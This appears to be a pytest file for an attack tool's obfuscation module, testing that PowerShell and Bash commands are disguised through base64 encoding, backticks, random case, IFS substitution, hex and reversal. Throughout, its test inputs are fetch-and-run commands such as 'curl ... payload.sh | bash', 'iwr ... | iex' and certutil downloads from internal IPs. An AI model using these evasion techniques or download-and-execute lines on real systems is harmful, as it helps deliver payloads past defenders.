"""Tests for obfuscate_.py: PowerShell and Bash obfuscation output validity."""

import base64
import re

import pytest

from exchanger.obfuscate_ import (
    obfuscate_bash,
    obfuscate_powershell,
    _bash_base64_wrap,
    _bash_hex_command,
    _bash_printf_command,
    _bash_rev_wrap,
    _bash_ifs_substitution,
    _bash_quote_tricks,
    _random_case,
    _backtick_insert,
    _format_string_iex,
    _gcm_wildcard_iex,
    _ps_encoded_command,
    _ps_scriptblock,
)


# ---------------------------------------------------------------------------
# PowerShell obfuscation
# ---------------------------------------------------------------------------

def test_obfuscate_powershell_returns_non_empty():
    cmd = 'iwr -Uri "http://192.168.1.1/x" -UseBasicParsing | iex'
    out = obfuscate_powershell(cmd)
    assert len(out) > 0


def test_obfuscate_powershell_contains_uri_or_encoded():
    """After obfuscation, the URL must be present either literally, in base64, or in -enc."""
    cmd = 'iwr -Uri "http://h/p" -OutFile "out"'
    for _ in range(20):
        out = obfuscate_powershell(cmd)
        # URL present literally, or wrapped in -enc (base64), or b64 encoded
        has_literal = "http" in out
        has_enc = "-enc" in out.lower() or "powershell" in out.lower()
        has_b64 = "FromBase64String" in out
        has_scriptblock = "scriptblock" in out.lower()
        assert has_literal or has_enc or has_b64 or has_scriptblock, f"URL lost in: {out}"


def test_obfuscate_powershell_true_false_substitute():
    cmd = "something $True and $False"
    out = obfuscate_powershell(cmd)
    # May be wrapped in -enc; if not, substitution should apply
    if "-enc" not in out.lower() and "scriptblock" not in out.lower():
        assert "[bool]1" in out
        assert "[bool]0" in out


def test_obfuscate_powershell_iex_obfuscated():
    """iex should be obfuscated in various ways."""
    cmd = "iex (Get-Content x)"
    results = [obfuscate_powershell(cmd) for _ in range(30)]
    techniques_seen = set()
    for out in results:
        out_lower = out.lower()
        if "-enc" in out_lower:
            techniques_seen.add("enc")
        elif "scriptblock" in out_lower:
            techniques_seen.add("scriptblock")
        elif "gcm" in out_lower or "get-command" in out_lower:
            techniques_seen.add("gcm")
        elif '"{0}' in out:
            techniques_seen.add("format")
        elif "''" in out or '""' in out or "`" in out:
            techniques_seen.add("obfuscated")
        elif "iex" in out_lower:
            techniques_seen.add("case")
    # At least 2 different techniques should appear in 30 calls
    assert len(techniques_seen) >= 2, f"Only saw: {techniques_seen}"


def test_obfuscate_powershell_certutil_bitsadmin_case():
    cmd = "certutil -urlcache -split -f http://h/x out"
    for _ in range(10):
        out = obfuscate_powershell(cmd)
        # Either case-randomized certutil, or whole thing wrapped in -enc/scriptblock
        assert "certutil" in out.lower() or "-enc" in out.lower() or "scriptblock" in out.lower()


def test_obfuscate_powershell_url_preserved():
    """The URL must remain functionally present after obfuscation."""
    url = "http://192.168.1.1/test.ps1"
    cmd = f'iwr -Uri "{url}" -UseBasicParsing | iex'
    for _ in range(20):
        out = obfuscate_powershell(cmd)
        flat = out.replace('" + "', "").replace("' + '", "")
        # URL present literally, or base64-encoded, or in -enc
        has_ip = "192.168.1.1" in flat
        has_enc = "-enc" in flat.lower()
        has_b64 = "FromBase64String" in flat
        has_scriptblock = "scriptblock" in flat.lower()
        assert has_ip or has_enc or has_b64 or has_scriptblock, f"URL lost in: {out}"


# ---------------------------------------------------------------------------
# PowerShell helper functions
# ---------------------------------------------------------------------------

def test_random_case_returns_same_length():
    s = "Invoke-WebRequest"
    out = _random_case(s)
    assert len(out) == len(s)
    assert out.lower() == s.lower()


def test_backtick_insert():
    s = "Invoke-WebRequest"
    out = _backtick_insert(s)
    assert "`" in out
    assert out.replace("`", "") == s


def test_format_string_iex():
    out = _format_string_iex()
    assert "i" in out and "e" in out and "x" in out
    assert "-f" in out


def test_gcm_wildcard_iex():
    out = _gcm_wildcard_iex()
    assert "gcm" in out.lower() or "get-command" in out.lower()


def test_ps_encoded_command():
    cmd = "Write-Host hello"
    out = _ps_encoded_command(cmd)
    assert "powershell" in out
    assert "-enc" in out
    # Decode and verify
    enc_part = out.split("-enc ")[1]
    decoded = base64.b64decode(enc_part).decode("utf-16-le")
    assert decoded == cmd


def test_ps_scriptblock():
    cmd = "Write-Host hello"
    out = _ps_scriptblock(cmd)
    assert "scriptblock" in out.lower()
    assert "hello" in out


# ---------------------------------------------------------------------------
# Bash obfuscation
# ---------------------------------------------------------------------------

def test_obfuscate_bash_returns_non_empty():
    cmd = "curl -s http://192.168.1.1/x | bash"
    out = obfuscate_bash(cmd)
    assert len(out) > 0


def test_obfuscate_bash_base64_wrap_decodes_to_original():
    cmd = "curl -s http://example.com/script | bash"
    wrapped = _bash_base64_wrap(cmd)
    assert "base64 -d" in wrapped
    match = re.search(r"echo\s+(\S+)\s+\|", wrapped)
    assert match
    decoded = base64.b64decode(match.group(1)).decode()
    assert decoded == cmd


def test_obfuscate_bash_quote_tricks_preserves_length_plus_quotes():
    s = "curl"
    out = _bash_quote_tricks(s)
    assert "''" in out
    assert out.replace("''", "") == "curl"


def test_obfuscate_bash_multiple_calls_produce_variants():
    """Multiple calls should produce diverse obfuscation techniques."""
    cmd = "wget -qO- http://x/y | bash"
    results = [obfuscate_bash(cmd) for _ in range(30)]
    techniques = set()
    for out in results:
        if "base64 -d" in out:
            techniques.add("base64")
        elif "printf" in out:
            techniques.add("printf")
        elif "$'" in out and "\\x" in out:
            techniques.add("hex")
        elif "rev" in out:
            techniques.add("rev")
        elif "${IFS}" in out:
            techniques.add("ifs")
        elif "${!" in out:
            techniques.add("double_var")
        elif "='wget'" in out or "=wget" in out:
            techniques.add("var")
        elif "''" in out:
            techniques.add("quote")
        else:
            techniques.add("identity")
    assert len(techniques) >= 3, f"Only saw: {techniques}"


def test_obfuscate_bash_base64_roundtrip_preserves_command():
    cmd = "curl -s http://10.0.0.1/payload.sh | bash"
    wrapped = _bash_base64_wrap(cmd)
    match = re.search(r"echo\s+(\S+)\s+\|", wrapped)
    assert match, f"unexpected format: {wrapped}"
    decoded = base64.b64decode(match.group(1)).decode()
    assert decoded == cmd


# ---------------------------------------------------------------------------
# Bash helper functions
# ---------------------------------------------------------------------------

def test_bash_hex_command():
    out = _bash_hex_command("curl")
    assert out.startswith("$'")
    assert "\\x63\\x75\\x72\\x6c" in out


def test_bash_printf_command():
    out = _bash_printf_command("wget")
    assert "printf" in out
    assert "\\x77\\x67\\x65\\x74" in out


def test_bash_rev_wrap():
    cmd = "echo hello"
    out = _bash_rev_wrap(cmd)
    assert "rev" in out
    assert cmd[::-1] in out


def test_bash_ifs_substitution():
    cmd = "curl -s http://x/y"
    out = _bash_ifs_substitution(cmd)
    assert "${IFS}" in out
    assert " " not in out
